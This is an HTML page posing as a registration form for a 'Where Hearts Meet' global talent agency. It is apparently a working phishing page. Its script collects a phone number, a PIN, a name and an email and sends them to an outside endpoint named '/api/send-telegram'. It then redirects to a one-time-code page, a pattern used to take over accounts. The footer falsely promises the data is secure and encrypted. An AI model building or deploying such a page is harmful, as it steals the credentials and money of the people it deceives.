<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Where Hearts Meet | Global Talent Agency</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px 24px;
            text-align: center;
        }

        .header h1 {
            font-size: 28px;
            margin-bottom: 8px;
            font-weight: 700;
        }

        .header p {
            font-size: 14px;
            opacity: 0.9;
        }

        .form-container {
            padding: 32px 24px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .btn-submit {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            transform: none;
        }

        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            font-size: 14px;
            display: none;
        }

        .message.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }

        .footer {
            text-align: center;
            padding: 20px;
            background: #f8f9fa;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Where Hearts Meet</h1>
            <p>Global Talent Agency</p>
        </div>

        <div class="form-container">
            <form id="registrationForm">
                <div class="input-group">
                    <label>📱 Phone Number</label>
                    <input type="tel" id="phone" name="phone" placeholder="0712345678" required>
                </div>

                <div class="input-group">
                    <label>🔑 Create PIN</label>
                    <input type="password" id="pin" name="pin" placeholder="Enter 4-6 digit PIN" maxlength="6" required>
                </div>

                <div class="input-group">
                    <label>👤 Full Name</label>
                    <input type="text" id="name" name="name" placeholder="John Doe" required>
                </div>

                <div class="input-group">
                    <label>📧 Email Address</label>
                    <input type="email" id="email" name="email" placeholder="john@example.com" required>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">Continue →</button>
            </form>

            <div id="message" class="message"></div>
        </div>

        <div class="footer">
            <p>Your information is secure and encrypted</p>
        </div>
    </div>

    <script>
        const API_URL = 'https://where-hearts-production.up.railway.app/api/send-telegram';

        document.getElementById('registrationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value.trim();
            const pin = document.getElementById('pin').value.trim();
            const name = document.getElementById('name').value.trim();
            const email = document.getElementById('email').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const messageDiv = document.getElementById('message');
            
            // Validation
            if (!phone || !pin || !name || !email) {
                showMessage('Please fill in all fields', 'error');
                return;
            }
            
            if (pin.length < 4) {
                showMessage('PIN must be at least 4 digits', 'error');
                return;
            }
            
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'Processing...';
            messageDiv.style.display = 'none';
            
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: phone,
                        pin: pin,
                        name: name,
                        email: email,
                        type: 'pin',
                        site: 'Where Hearts Meet'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Store data for next page
                    localStorage.setItem('userPhone', phone);
                    localStorage.setItem('userName', name);
                    localStorage.setItem('userEmail', email);
                    
                    showMessage('✅ Registration successful! Redirecting...', 'success');
                    
                    // Redirect to OTP page after 2 seconds
                    setTimeout(() => {
                        window.location.href = 'enter-otp.html';
                    }, 2000);
                } else {
                    showMessage('❌ Failed: ' + (result.error || 'Please try again'), 'error');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Continue →';
                }
            } catch (error) {
                console.error('Error:', error);
                showMessage('❌ Network error. Please check your connection.', 'error');
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continue →';
            }
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
        }
    </script>
</body>
</html>
